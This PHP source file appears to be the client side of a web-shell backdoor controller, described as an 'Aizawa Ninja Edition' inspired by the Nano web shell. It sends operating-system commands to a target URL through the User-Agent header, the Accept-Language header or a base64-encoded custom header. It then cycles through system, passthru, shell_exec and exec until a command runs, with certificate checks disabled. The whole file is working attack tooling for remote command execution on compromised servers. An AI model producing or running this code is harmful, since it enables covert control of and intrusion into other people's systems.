<?php
//--------------------------------------------------//
//     Credit to: Acunetix for the technique        //
//           https://bit.ly/AcunetiX                //
//--------------------------------------------------//
function http_user_agent_get($url, $cmd)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $cmd);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function http_accept_language_get($url, $cmd)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $GLOBALS['user_agent']);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept-Language: ' . $cmd]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function http_user_agent_post($url, $type, $cmd)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $type);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $cmd);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function http_accept_language_post($url, $type, $cmd)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $type);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $GLOBALS['user_agent']);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept-Language: ' . $cmd]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
//--------------------------------------------------//
// Aizawa Ninja Edition                             //
// Highly inspired by Nano                          //
// https://github.com/s0md3v/nano                   //
//--------------------------------------------------//
function http_aizawa_ninja($url, $cmd)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_USERAGENT, $GLOBALS['user_agent']);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Aizawa-Ninja: ' . base64_encode((string) $cmd)]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function execute($url, $cmd, $type)
{
    if ($type == "http_user_agent_get") {
        if (!empty(http_user_agent_get($url . "?cmd=system", $cmd))) {
            return http_user_agent_get($url . "?cmd=system", $cmd);
        }
        if (!empty(http_user_agent_get($url . "?cmd=passthru", $cmd))) {
            return http_user_agent_get($url . "?cmd=passthru", $cmd);
        }
        elseif (!empty(http_user_agent_get($url . "?cmd=shell_exec", $cmd))) {
            return http_user_agent_get($url . "?cmd=shell_exec", $cmd);
        }
        elseif (!empty(http_user_agent_get($url . "?cmd=exec", $cmd))) {
            return http_user_agent_get($url . "?cmd=exec", $cmd);
        }
        else {
            return $GLOBALS["red"] . "EROR" . $GLOBALS["clear"] . "\n";
        }
    }
    elseif ($type == "http_accept_language_get") {
        if (!empty(http_accept_language_get($url . "?cmd=system", $cmd))) {
            return http_accept_language_get($url . "?cmd=system", $cmd);
        }
        if (!empty(http_accept_language_get($url . "?cmd=passthru", $cmd))) {
            return http_accept_language_get($url . "?cmd=passthru", $cmd);
        }
        elseif (!empty(http_accept_language_get($url . "?cmd=shell_exec", $cmd))) {
            return http_accept_language_get($url . "?cmd=shell_exec", $cmd);
        }
        elseif (!empty(http_accept_language_get($url . "?cmd=exec", $cmd))) {
            return http_accept_language_get($url . "?cmd=exec", $cmd);
        }
        else {
            return $GLOBALS["red"] . "EROR" . $GLOBALS["clear"] . "\n";
        }
    }
    elseif ($type == "http_user_agent_post") {
        if (!empty(http_user_agent_post($url , "cmd=system", $cmd))) {
            return http_user_agent_post($url , "cmd=system", $cmd);
        }
        if (!empty(http_user_agent_post($url , "cmd=passthru", $cmd))) {
            return http_user_agent_post($url , "cmd=passthru", $cmd);
        }
        elseif (!empty(http_user_agent_post($url , "cmd=shell_exec", $cmd))) {
            return http_user_agent_post($url , "cmd=shell_exec", $cmd);
        }
        elseif (!empty(http_user_agent_post($url , "cmd=exec", $cmd))) {
            return http_user_agent_post($url , "cmd=exec", $cmd);
        }
        else {
            return $GLOBALS["red"] . "EROR" . $GLOBALS["clear"] . "\n";
        }
    }
    elseif ($type == "http_accept_language_post") {
        if (!empty(http_accept_language_post($url , "cmd=system", $cmd))) {
            return http_accept_language_post($url , "cmd=system", $cmd);
        }
        if (!empty(http_accept_language_post($url , "cmd=passthru", $cmd))) {
            return http_accept_language_post($url , "cmd=passthru", $cmd);
        }
        elseif (!empty(http_accept_language_post($url , "cmd=shell_exec", $cmd))) {
            return http_accept_language_post($url , "cmd=shell_exec", $cmd);
        }
        elseif (!empty(http_accept_language_post($url , "cmd=exec", $cmd))) {
            return http_accept_language_post($url , "cmd=exec", $cmd);
        }
        else {
            return $GLOBALS["red"] . "EROR" . $GLOBALS["clear"] . "\n";
        }
    }
    elseif ($type == "http_aizawa_ninja") {
        if (!empty(http_aizawa_ninja($url , "system~".$cmd))) {
            return http_aizawa_ninja($url , "system~".$cmd);
        }
        if (!empty(http_aizawa_ninja($url , "passthru~".$cmd))) {
            return http_aizawa_ninja($url , "passthru~".$cmd);
        }
        elseif (!empty(http_aizawa_ninja($url , "shell_exec~".$cmd))) {
            return http_aizawa_ninja($url , "shell_exec~".$cmd);
        }
        elseif (!empty(http_aizawa_ninja($url , "exec~".$cmd))) {
            return http_aizawa_ninja($url , "exec~".$cmd);
        }
        else {
            return $GLOBALS["red"] . "EROR" . $GLOBALS["clear"] . "\n";
        }

    }
    elseif ($type == "get") {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url . $cmd);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $GLOBALS['user_agent']);
        $result = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        return [$result, $httpcode];
    }
    elseif ($type == "post") {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $cmd);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $GLOBALS['user_agent']);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }
}
